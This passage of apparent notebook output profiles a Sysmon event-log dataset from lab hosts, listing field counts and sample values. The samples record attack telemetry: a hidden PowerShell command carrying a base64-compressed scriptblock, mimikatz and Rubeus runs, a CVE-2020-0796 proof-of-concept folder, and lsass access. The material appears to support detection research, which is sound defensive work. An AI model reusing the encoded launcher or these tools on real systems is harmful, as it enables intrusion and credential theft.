'GrantedAccess': 21, 'CallTrace': 238, 'SourceUser': 9, 'TargetUser': 13, 'TargetFilename': 8092, 'CreationUtcTime': 2730, 'EventType': 9, 'TargetObject': 12471, 'Details': 2038, 'PipeName': 16, 'QueryName': 409, 'QueryStatus': 9, 'QueryResults': 677, 'IsExecutable': 5, 'Archived': 4, 'SourceProcessGuid': 49, 'TargetProcessGuid': 306, 'NewThreadId': 281, 'StartAddress': 52, 'StartModule': 6, 'StartFunction': 5, 'PreviousCreationUtcTime': 127, 'Hash': 99, 'Contents': 43, 'ID': 4, 'Label': 3, 'Unnamed: 0': 1901979}\n",
      "\n",
      "First 10 Unique Values: {'Name': ['Microsoft-Windows-Sysmon'], 'Guid': ['{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'], 'EventID': ['2', '3.0', '18.0', '13.0', '15', '23', '18', '8', '12.0', '16.0'], 'Version': ['3', '2', '3.0', '1.0', '5', '4', '2.0', '4.0', '1', '5.0'], 'Level': ['2.0', '2', '4.0', '4'], 'Task': ['2', '3.0', '18.0', '13.0', '15', '23', '18', '8', '12.0', '16.0'], 'Opcode': ['0.0', '0'], 'Keywords': ['0x8000000000000000'], 'SystemTime': ['2021-09-08 23:00:50.480247', '2022-11-15 09:04:17.865148', '2023-11-29 13:19:27.126721', '2023-11-27 06:21:34.181249', '2022-11-12 21:55:03.680085', '2023-11-27 12:23:21.474962', '2021-09-11 15:15:37.540497', '2021-09-08 04:38:07.770105', '2023-11-29 07:12:20.600505', '2022-10-11 05:05:12.557212'], 'EventRecordID': ['115921473', '55911201', '32247.0', '115921678.0', '25428.0', '17620.0', '110561983', '26831', '115816584', '30405.0'], 'Correlation': ['0.0', 'nan'], 'Execution_ProcessID': ['3064', '20972', '3012', '5520.0', '2916.0', '5676.0', '3120', '3044.0', '3052.0', '5520'], 'ProcessID': ['2252.0', '5520.0', '2212.0', '3120', '2072.0', '2228', '2192', '3044.0', '2324.0', '2160'], 'ThreadID': ['3048.0', '5096', '2448.0', '3180.0', '3120', '2560.0', '3460.0', '388.0', '3316.0', '3352.0'], 'Channel': ['Microsoft-Windows-Sysmon/Operational'], 'Computer': ['win-dc-128.attackrange.local', 'WINDOWS10EVAL.stefania.local', 'win-dc-800.attackrange.local', 'LAPTOP-ROPR18AK', 'win-host-100.attackrange.local', 'win-host-987.attackrange.local', 'WIN-J23NIGGP1Q6.sysmon_set.local', 'win-dc-469.attackrange.local'], 'UserID': ['S-1-5-21-332653114-629412497-1093265668-1112', 'S-1-5-21-332653114-629412497-1093265668-1113', 'S-1-5-21-3153833558-3459030340-3832526456-1001', 'S-1-5-18'], 'RuleName': ['nan', 'Sysmon_Event_3(NetworkConnect)', 'Context,DeviceConnectedOrUpdated', 'Sysmon_Event_1(ProcessCreate)', 'T1053', 'InvDB-Path', 'T1023', 'ModifyRemoteDesktopState', 'Alert,Sysinternals Tool Used', 'InvDB'], 'UtcTime': ['44:24.2', '42:06.2', '47:24.1', '38:27.0', '28:31.6', '36:48.2', '25:52.8', '33:10.2', '22:53.5', '22:23.3'], 'ProcessGuid': ['{27532e6a-ef27-61a5-f400-000000001700}', '{a190aab6-af9a-6390-8400-000000001e00}', '{a190aab6-f55f-63be-3200-000000003600}', '{a190aab6-09b7-639b-6800-000000001b00}', '{a190aab6-fa02-639a-3700-000000001a00}', '{a190aab6-1a60-639d-1700-000000002800}', '{a190aab6-4733-639c-c600-000000002700}', '{a190aab6-61ca-638f-7604-000000001c00}', '{a190aab6-1c8e-638e-1e02-000000001c00}', '{27532e6a-e9e2-61a9-7900-000000001900}'], 'ProcessId': ['3576.0', '3048.0', '6120.0', '4812.0', '3180.0', '436.0', '5516.0', '3460.0', '6552.0', '3876.0'], 'Image': ['C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\vhjSBRkxzNz.exe', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.227.1030.0001\\\\FileSyncConfig.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\Windows-KB890830-x64-V5.109.exe', 'C:\\\\Windows\\\\System32\\\\wlms\\\\wlms.exe', 'C:\\\\Windows\\\\System32\\\\tzsync.exe', 'C:\\\\Windows\\\\System32\\\\notepad.exe', 'C:\\\\Windows\\\\system32\\\\regsvr32.exe', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\Desktop\\\\CVE-2020-0796-RCE-POC\\\\tools\\\\link.exe', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.227.1030.0001\\\\FileSyncConfig.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\AM_Delta_Patch_1.381.521.0.exe'], 'FileVersion': ['1.379.951.0', '4.18.2110.6 (WinBuild.160101.0800)', '10.0.19041.1566 (WinBuild.160101.0800)', '4.8.4190.0 built by: NET48REL1LAST_B', '10.0.14321.1024 (debuggers(dbg).210127-1811)', '10.0.19041.1949 (WinBuild.160101.0800)', '10.0.14393.3297 (rs1_release_1.191001-1045)', '1.381.58.0', '10.0.14393.3503 (rs1_release.200131-0410)', '10.0.14393.2363 (rs1_release.180625-1741)'], 'Description': ['Credential Vault Client Library', 'Microsoft Antimalware WU Stub', 'RAS PLAP Credential Provider', 'Windows Logon Application', 'Microsoft OneDrive (64 bit) Setup', 'Windows Gaming Input API', 'Windows Features', 'Sink to receive asynchronous callbacks for WMI client application', 'Microsoft XmlLite Library', 'Microsoft Desktop Window Manager Redirection Component'], 'Product': ['Windows Drive Optimizer', 'nan', 'Rubeus', 'Microsoft Setup Bootstrapper', '2007 Microsoft Office system', 'Python', 'Internet Explorer', 'Apache HTTP Server', 'Windows (R) Win 7 DDK driver', 'Office Source Engine'], 'Company': ['Python Software Foundation', 'nan', 'Splunk Inc.', 'gentilkiwi (Benjamin DELPY)', 'Oracle Corporation', 'Microsoft Corp.', 'Sysinternals', 'Apache Software Foundation', 'Windows (R) Win 7 DDK provider', 'The OpenSSL Project, http://www.openssl.org/'], 'OriginalFileName': ['REGEDIT.EXE', 'mfplat.dll', 'splunk-winprintmon.exe', 'TrustedInstaller.exe', 'ipconfig.exe', 'CONTROL.EXE', 'SAMCLI.DLL', 'slc.dll', 'system.transactions.dll', 'DevDispItemProvider.dll'], 'CommandLine': ['\"C:\\\\Windows\\\\system32\\\\defrag.exe\" -p 34 -s 00000000000009D0 -b -OnlyPreferred C:', '\"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.XboxGamingOverlay_5.822.10271.0_x64__8wekyb3d8bbwe\\\\GameBarFTServer.exe\" -Embedding', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=4564 --field-trial-handle=2056,i,4152305477274176820,8620523121663762370,131072 /prefetch:8', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=2068 --field-trial-handle=1916,i,14281395950088574081,10161112876108610809,131072 /prefetch:3', 'consent.exe 276 426 0000026FD59EC9A0', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=utility --mojo-platform-channel-handle=2356 --field-trial-handle=2044,i,1413821435695755471,16507231761416659504,131072 /prefetch:8', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" --type=renderer --instant-process --display-capture-permissions-policy-allowed --js-flags=--ms-user-locale= --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=89 --time-ticks-at-unix-epoch=-1670250280888440 --launch-time-ticks=44205913530 --mojo-platform-channel-handle=3760 --field-trial-handle=2136,i,16787519892399853665,9204729640996707359,131072 /prefetch:1', 'C:\\\\Windows\\\\System32\\\\Upfc.exe /launchtype periodic /cv fp+YUIFf70ai2LnNUR6URQ.0', '\"LogonUI.exe\" /flags:0x0 /state0:0xa3eb6055 /state1:0x41c64e6d', '\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\NGenTask.exe\" /RuntimeWide /Critical /StopEvent:408'], 'CurrentDirectory': ['C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\1.3.171.37\\\\', 'C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\EUA53E.tmp\\\\', 'C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\EUF936.tmp\\\\', 'C:\\\\Windows\\\\', 'C:\\\\Windows\\\\Temp\\\\4C1DF9E8-CBFF-4151-B96E-548E52B0EE77-Sigs\\\\', 'C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\108.0.1462.42\\\\Installer\\\\', 'C:\\\\Tools\\\\x64\\\\', 'C:\\\\Program Files (x86)\\\\Microsoft\\\\Temp\\\\EU5A5B.tmp\\\\', 'C:\\\\Users\\\\Administrator\\\\Desktop\\\\', 'C:\\\\Users\\\\Administrator.ATTACKRANGE\\\\'], 'User': ['Font Driver Host\\\\UMFD-1', 'nan', 'SYSMON_SET\\\\chr.smilio', 'Window Manager\\\\DWM-4', 'NT AUTHORITY\\\\LOCAL SERVICE', 'NT AUTHORITY\\\\SYSTEM', 'Font Driver Host\\\\UMFD-0', '0', 'STEFANIA\\\\altinistef', 'Window Manager\\\\DWM-1'], 'LogonGuid': ['{a190aab6-547f-63be-e703-000000000000}', '{a190aab6-4453-639c-e503-000000000000}', '{a190aab6-99a8-638b-e403-000000000000}', '{27532e6a-8433-61a5-e403-000000000000}', '{a190aab6-c3c3-63b9-e703-000000000000}', '{a190aab6-5aba-6390-8463-060000000000}', '{a190aab6-565d-6385-e503-000000000000}', '{B81B27B7-4B39-61E8-E703-000000000000}', '{a190aab6-c889-6387-e503-000000000000}', '{a190aab6-d3d4-63be-72d0-000000000000}'], 'LogonId': ['0x45823', '0x6cf1', '0x8728d', '0x23c432', '0x25a35c', '0xd3c6', '0x9d0577e', '0xd1fb', '0x66384', '0x3e7'], 'TerminalSessionId': ['nan', '3.0', '5.0', '1.0', '2.0', '4.0', '0.0'], 'IntegrityLevel': ['nan', '0', 'Low', 'System', 'AppContainer', 'Medium', 'High'], 'Hashes': ['MD5=5695F7E5FF71CCA19B5E81777D2FC869,SHA256=9776272A17233AC3D3506352B26B31FD924863FB2D4435D5C0314E5EE37D5810,IMPHASH=00000000000000000000000000000000', 'MD5=69C7AE5634DE801768ACB76C9BD2A4E8,SHA256=E4E0C2A575F33132F04278F4BF4438A6DD578A1B59E4347B95F96C05835D1EE9,IMPHASH=00000000000000000000000000000000', 'MD5=98F8717E21E03133AE80EAF22A0A7535,SHA256=703F7882D8C980E1FF73A4FC63B9CD87FF8B27C0C13F06B29B6EBCEA2CFD9EB3,IMPHASH=00000000000000000000000000000000', 'MD5=3DCBAE237E4E1F0EBE8E7DC053F778C4,SHA256=C3331CCBE71CC98A5F1BC013F1C0218FE194CA7B497DDF706BF9025AB5A7B330', 'MD5=E62973F200FA557193A57AA00316DFD7,SHA256=76BAFC49AE6E0B59BFBB79EF863147A84A931F87FE998CE01EEFBD98F386E769,IMPHASH=00000000000000000000000000000000', 'MD5=D191554EC9792A38D084F789F13DF799,SHA256=8D2ECCCFBA3F42C8356B7BD423D4FAD3EFC4FE2CD8A938E7C6AF7771983E7581,IMPHASH=00000000000000000000000000000000', 'MD5=FB641314AD61806FAA7042EC38C23FBA,SHA256=DB145B19EC7B6885995E54C7F5D57BE45FD3048C2377ADDA6240BAD3227C8348,IMPHASH=00000000000000000000000000000000', 'MD5=E3DE1589DA987C9BFE13083688988719,SHA256=29077D20EADC005535AE60C03FE349107AEE689E480ED635D9747BFDE2F0B1A9,IMPHASH=00000000000000000000000000000000', 'MD5=BC75130AF99EA1D834655AED7D10A4B6,SHA256=76E102E3034011860DD8E1C406BE1D06209AE65E685C80B3676E9BB9CDCCBD80,IMPHASH=00000000000000000000000000000000', 'MD5=CC092918B84FD14992A93C6B3A7B6387,SHA256=529EA58B2536DE0E4594BDDFE7DB63453F5F24306EE2D2989BF4A7D78140BFCA,IMPHASH=00000000000000000000000000000000'], 'ParentProcessGuid': ['{27532e6a-2fa3-61af-0801-000000001d00}', '{27532e6a-9820-61a8-be00-000000001800}', '{a190aab6-cba3-6384-ca01-000000001600}', '{27532e6a-d9ef-61a5-2600-000000001700}', '{a190aab6-8bdc-638e-0500-000000001c00}', '{a190aab6-bfb9-63be-6c01-000000001e00}', '{a190aab6-5b70-6390-c400-000000001d00}', '{27532e6a-2eb0-61af-bf00-000000001d00}', '{a190aab6-6825-6387-6502-000000001800}', '{a190aab6-26ed-6389-ed01-000000001600}'], 'ParentProcessId': ['6080.0', '4092.0', '492.0', '3576.0', '3048.0', '4940.0', '6120.0', '4812.0', '7360.0', '1176.0'], 'ParentImage': ['C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\AM_Delta_Patch_1.353.1952.0.exe', 'C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\vhjSBRkxzNz.exe', 'C:\\\\Program Files\\\\Oracle\\\\VirtualBox Guest Additions\\\\Update\\\\VBoxWindowsAdditions-amd64.exe', 'C:\\\\Windows\\\\Temp\\\\9AC0D483-D5DE-4E61-9837-0C6B70EEF641\\\\MpSigStub.exe', 'C:\\\\Windows\\\\System32\\\\cleanmgr.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\Windows-KB890830-x64-V5.109.exe', 'C:\\\\Windows\\\\System32\\\\tzsync.exe', 'C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\Install\\\\{B26F6B19-6D6E-4B2D-9B90-C4438D9544FF}\\\\MicrosoftEdge_X64_108.0.1462.76_108.0.1462.46.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\AM_Delta_Patch_1.381.521.0.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\Windows-KB890830-x64-V5.108.exe'], 'ParentCommandLine': ['C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p', '\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.2110.6-0\\\\MpCmdRun.exe\" SignatureUpdate -ScheduleJob -RestrictPrivileges', 'C:\\\\Windows\\\\System32\\\\Upfc.exe /launchtype periodic /cv fp+YUIFf70ai2LnNUR6URQ.0', 'C:\\\\Windows\\\\system32\\\\cmd.exe /c \"\"C:\\\\Users\\\\altinistef.STEFANIA\\\\Desktop\\\\CVE-2020-0796-RCE-POC\\\\calc_target_offsets.bat\" \"', '\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\NGenTask.exe\" /RuntimeWide /StopEvent:596', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\Install\\\\{0AF6D023-3964-40E7-AEAD-233A0FE93426}\\\\MicrosoftEdge_X64_108.0.1462.54.exe\" --msedgewebview --verbose-logging --do-not-launch-msedge --system-level', '\"C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\winrar-x32-611.exe\" ', '\"C:\\\\Windows\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(\\'H4sIAGz5qWECA7VWbW+bSBD+nEj5D6iyBKiOwTbXNJEq3QLGdhM7OMTvZ53WsIZtFtaBdRyn1/9+gw1pqqZ37UmH/LIvM7szzzwzw2qT+ILyRHryvDPp88nxkYtTHEtK5UlUpUpaX5uWenQE6xUsQr8vfZCUOVqvbR5jmiwuLqxNmpJEHOa1NhEoy0i8ZJRkiir9JY0jkpLT6+Un4gvps1T5s9ZmfIlZIbazsB8R6RQlQb53xX2cm1Pz1owKRf7jD1mdn9YXtdb9BrNMkb1dJkhcCxiTVemLml94u1sTRe5RP+UZX4namCbNRm2YZHhF+nDaA+kREfEgk1VwAz4pEZs0kQ4O5Scc9hUZhm7KfRQEKckyuSrN87Pni8Xvyry4+GaTCBqTWjcRJOVrj6QP1CdZrYOTgJEbslqAlidSmoQLVQWxB35HlEqyYawq/coxSp9sS9h+Vkl5qQRSrkjVKoTyNUd7PNgwclCVX7EU4q/C88wBwO7LyfHJ8aokzKObvuQLjI7m+zEB6xSXZ3Qv9kHSq1IPrsGCpzuYVm7TDVEXz9hCHJbVH2vXS1EQDNysRWFtPuI0WIBOEdAKj/LVH9PSJiuaEHuX4Jj6JfOU1yAmK0b2/tVKsT7YpMjFBglswkiIRY5ZHunv1FoxFc+65oaygKTIhzBlYBVEUP3WmEMYFLmb9EgMAB3mQL3KCvhOSumC47vy9nwOQrLFcJZVJXcDCedXJY9gRoKqhJKMFltoI/h+KH81t7dhgvo4E+VxC/WAYnGbxZNMpBsfIgae33pr4lPMciCqUocGxNx5NCxvlV+FwcKMQQ7ASQ8QBljJ3fdEzoMUDISYqzWPiG68ZiQGiX3WOwyHkOMFz/e0wSEJ5G+tK0l8YGyOQun+C9sgtB7jUMJGNBVQOnJE9/T5L3e/qBlghZWSIgJKmRRzcydyLleWs5yIBRx751MBjjspj02ckXfGoTQob7Rr6iJ4pnbHm3WF1+smjNa7PfgO7bPg8uOnjkabXd7zrcxtO+8R3YZb/30f+cHHgJx7IDcYGcJyUWdAddOIfFO/3Y/DKa2HIQr6g8hnutuKr/rd7FHbdsY93zafto0M6GgYnYmOmk3juqnfAWi5zh3oxHT7eAVjqIHXV2Y3M/Uua320bpbjhjMbs45mONFqzDPv3dTWNO08wHZvh5DJg2ZvN6nf8NuOH5tGwrVzy7hDLYSspDVyTH45NVPkaiMcrvn2MjTtOLSQ6fiUzAZDxxwMHBMN25/u7XMt1M7HExyZ41GDztaTmwjmzrYzuNR0oxuQJz7bAnBtjnB4AzKh1fCjFcjYb5H5ts+zBr4zOTJBxpndo3Y0XTsug/3bYYOjEetPMLqa7RxNq09dA3V0Pm6HaADiODQHGGUP9pOt1UcBD8a/9acrbTRhZ5ptDdxokvusreP8d9uxL/1Zfetfnxmmfm/FNGbLRqCdD9+bCXjoPoTBYHx289jfLeHeoaaN3uRcAjJVHo175/YFUX5U2Hs4zSLMgEBQsMtcdXjqFDXY5TTXUJR9874jaUIYtD5ojiXtEWPcz3tAXq2h/RyaQt6jhjBsNl4dqdKzoPq1M5RLFxczMBLSaDmrXZEkFFFVf2zqOpR5/dHQwcefd8vi650CB1XzJnGA5XAw2x+s5rlVEd21cfX/olWkdAR/wb+g9XXtH3Z/CkG9Wnj83fq3C7+E6C+7PsZUgKQHVYmRQzN8FYGCGi/eFPZxgdiviid/27veiNM+vEGcHP8N1MWl0lkKAAA=\\'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))', 'net  localgroup administrators', 'C:\\\\Windows\\\\system32\\\\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:DJLsIyKvXkunqcua.1'], 'ParentUser': ['nan', 'NT AUTHORITY\\\\LOCAL SERVICE', 'NT AUTHORITY\\\\SYSTEM', '0', 'Window Manager\\\\DWM-1', 'ATTACKRANGE\\\\REED_SCHMIDT', 'STEFANIA\\\\altinistef', '-', 'NT AUTHORITY\\\\NETWORK SERVICE', 'STEFANIA\\\\altinitat'], 'Protocol': ['nan', 'udp', '0', 'tcp'], 'Initiated': ['nan', 'False', '0', 'True'], 'SourceIsIpv6': ['nan', 'False', '0', 'True'], 'SourceIp': ['192.168.1.255', 'nan', '192.168.1.8', '224.0.0.252', 'ff02:0:0:0:0:0:0:fb', '192.168.156.255', '192.168.1.6', 'ff02:0:0:0:0:0:0:c', '192.168.98.2', 'a00:10f:0:0:c850:983b:9ce:ffff'], 'SourceHostname': ['kali', 'nan', 'win-dc-128.attackrange.local', 'windev2011eval', 'WinDev2011Eval', 'laptop-ropr18ak', 'ip-10-0-1-15.us-west-2.compute.internal', 'win-host-987.attackrange.local', 'ip-10-0-1-255.us-west-2.compute.internal', '0'], 'SourcePort': ['51770.0', '63685.0', '52327.0', '59353.0', '52178.0', '50761.0', '50442.0', '63683.0', '42752.0', '51890.0'], 'SourcePortName': ['nan', 'netbios-ns', 'dhcpv6-client', 'ws-discovery', '0', 'domain', 'llmnr', 'bootpc', 'ntp', 'ssdp'], 'DestinationIsIpv6': ['nan', 'False', '0', 'True'], 'DestinationIp': ['38.27.122.126', '69.169.85.6', '20.189.173.5', '13.107.4.50', '20.228.200.50', '52.109.68.59', '151.101.129.21', '52.142.186.92', '51.11.192.48', '192.168.1.12'], 'DestinationHostname': ['kali', 'nan', 'mi-10', 'a104-109-93-180.deploy.static.akamaitechnologies.com', 'a2-21-69-161.deploy.static.akamaitechnologies.com', 'a2-19-106-148.deploy.static.akamaitechnologies.com', 'a23-222-48-85.deploy.static.akamaitechnologies.com', 'win-dc-128.attackrange.local', 'fra24s12-in-f4.1e100.net', 'a104-125-31-18.deploy.static.akamaitechnologies.com'], 'DestinationPort': ['54873.0', '63685.0', '58005.0', '62773.0', '65066.0', '63683.0', '51508.0', '58795.0', '61469.0', '64939.0'], 'DestinationPortName': ['nan', 'ws-discovery', 'dhcpv6-server', 'ldap', 'kerberos', 'microsoft-ds', 'llmnr', 'msft-gc', 'epmap', 'ntp'], 'State': ['nan', 'Started', '0'], 'Version2': ['13.24', 'nan', '0.0', '13.3'], 'SchemaVersion': ['nan', '4.83', '4.7', '4.81', '0.0'], 'Configuration': ['nan', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\Downloads\\\\Sysmon\\\\sysmonconfig1.xml', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\Sysmon\\\\Sysmon64.exe  -accepteula -i', '0', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\Downloads\\\\Sysmon\\\\Sysmon64.exe  -accepteula -i', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\Sysmon\\\\sysmonconfig1.xml', '0.0'], 'ConfigurationFileHash': ['nan', '0', 'SHA256=D8403434F116898DF95BA346905D5AF1DF99249E13298B430F16063A68CDF58E', 'SHA256=BE2EEF7710D2D276F482FC73A2039D653D5AB3F24657307DC3759783F9A86253', '0.0', '-'], 'ImageLoaded': ['C:\\\\Windows\\\\System32\\\\xmllite.dll', 'C:\\\\Windows\\\\System32\\\\advapi32.dll', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\System.Data\\\\f27dd71df7a6fe3f43a9e7a7c4e1870c\\\\System.Data.ni.dll', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\Microsoft.CSharp\\\\9311b6c382518fe61794f144e07fef90\\\\Microsoft.CSharp.ni.dll', 'C:\\\\Windows\\\\System32\\\\dxgi.dll', 'C:\\\\Windows\\\\System32\\\\dbgcore.dll', 'C:\\\\Windows\\\\System32\\\\WindowsCodecs.dll', 'C:\\\\Windows\\\\System32\\\\ExecModelClient.dll', 'C:\\\\Windows\\\\System32\\\\deviceassociation.dll', 'C:\\\\Windows\\\\System32\\\\shacct.dll'], 'Signed': ['nan', 'True', '0', 'False', '0.0'], 'Signature': ['Splunk, Inc.', 'nan', '0', 'Microsoft Windows Publisher', 'Microsoft Windows', 'Microsoft Corporation', '0.0', '-', 'Open Source Developer, Benjamin Delpy'], 'SignatureStatus': ['nan', 'Valid', '0', '0.0', 'Unavailable'], 'SourceProcessGUID': ['{B81B27B7-F667-6183-2200-00000000CA01}', '{3BF36828-60C3-619D-6ECD-02000000CC01}', '{F17A0B6A-3429-5F88-A800-000000007F01}', '{B81B27B7-4B3A-61E8-2100-00000000CE01}', '{B81B27B7-F665-6183-0B00-00000000CA01}', '{B81B27B7-AC0A-618E-9043-01000000CA01}', '{3BF36828-AC84-618E-3F12-01000000CC01}', '{B81B27B7-AED0-61F9-B10B-02000000CE01}', '{B81B27B7-3032-6194-851F-00000000CC01}', '{B81B27B7-4B39-61E8-0D00-00000000CE01}'], 'SourceProcessId': ['6080.0', '3576.0', '3048.0', '1176.0', '436.0', '3180.0', '3248.0', '1320.0', '5920.0', '4500.0'], 'SourceThreadId': ['3576.0', '988.0', '436.0', '5516.0', '1572.0', '3460.0', '2156.0', '4772.0', '3112.0', '5896.0'], 'SourceImage': ['nan', 'C:\\\\Users\\\\Administrator\\\\Downloads\\\\mimikatz_trunk\\\\x64\\\\mimikatz.exe', 'C:\\\\Windows\\\\System32\\\\VBoxTray.exe', 'C:\\\\Windows\\\\system32\\\\WinrsHost.exe', 'C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\GXeiPg.exe', 'C:\\\\Windows\\\\system32\\\\cmd.exe', 'C:\\\\Tools\\\\Rubeus.exe', 'C:\\\\Windows\\\\system32\\\\lsass.exe', 'C:\\\\Windows\\\\system32\\\\LogonUI.exe', 'C:\\\\Windows\\\\Explorer.EXE'], 'TargetProcessGUID': ['{B81B27B7-BB79-61F9-590D-02000000CE01}', '{B81B27B7-F667-6183-2200-00000000CA01}', '{3BF36828-A908-6202-4100-00000000D101}', '{3BF36828-60C3-619D-6ECD-02000000CC01}', '{3BF36828-A906-6202-3400-00000000D101}', '{F17A0B6A-3429-5F88-A800-000000007F01}', '{B81B27B7-4B3A-61E8-2100-00000000CE01}', '{B81B27B7-F665-6183-0B00-00000000CA01}', '{3BF36828-910A-619D-36D3-02000000CC01}', '{B81B27B7-AC0A-618E-9043-01000000CA01}'], 'TargetProcessId': ['4092.0', '492.0', '3576.0', '3048.0', '1176.0', '988.0', '4780.0', '1120.0', '436.0', '3180.0'], 'TargetImage': ['C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\etc\\\\apps\\\\Splunk_TA_stream\\\\windows_x86_64\\\\bin\\\\streamfwd.exe', 'C:\\\\Users\\\\Public\\\\splunkd.exe', 'C:\\\\Windows\\\\System32\\\\SearchProtocolHost.exe', 'C:\\\\Windows\\\\System32\\\\InstallAgent.exe', 'C:\\\\windows\\\\system32\\\\rundll32.exe', 'C:\\\\Windows\\\\system32\\\\ocspsvc.exe', 'C:\\\\Windows\\\\ADWS\\\\Microsoft.ActiveDirectory.WebServices.exe', 'C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-admon.exe', 'C:\\\\Windows\\\\System32\\\\lpremove.exe', 'C:\\\\Windows\\\\sysmon64.exe'], 'GrantedAccess': ['nan', '0x40', '0x101001', '0x100000', '0x101400', '0x1400', '0x1fffff', '0x1410', '0x3200', '0x14c0'], 'CallTrace': ['C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a7404|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+2b860|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+6b246|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+1c213|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16e61f|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16e295|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16dd86|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16f1f8|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16dbae|C:\\\\Windows\\\\System32\\\\windows.storage.dll+fd025|C:\\\\Windows\\\\System32\\\\windows.storage.dll+fd3a4|C:\\\\Windows\\\\System32\\\\windows.storage.dll+fc9e0|C:\\\\Windows\\\\System32\\\\windows.storage.dll+1664ae|C:\\\\Windows\\\\System32\\\\windows.storage.dll+1661a2|C:\\\\Windows\\\\System32\\\\SHELL32.dll+90ee1|C:\\\\Windows\\\\System32\\\\SHELL32.dll+8fd46|C:\\\\Windows\\\\System32\\\\SHELL32.dll+d0c11|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b6e2e|C:\\\\Windows\\\\System32\\\\windows.storage.dll+2d1a2|C:\\\\Windows\\\\System32\\\\windows.storage.dll+2ce99|C:\\\\Windows\\\\System32\\\\windows.storage.dll+2cd6f|C:\\\\Windows\\\\System32\\\\SHELL32.dll+d0c97|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b6e2e|C:\\\\Windows\\\\System32\\\\SHELL32.dll+1721db', 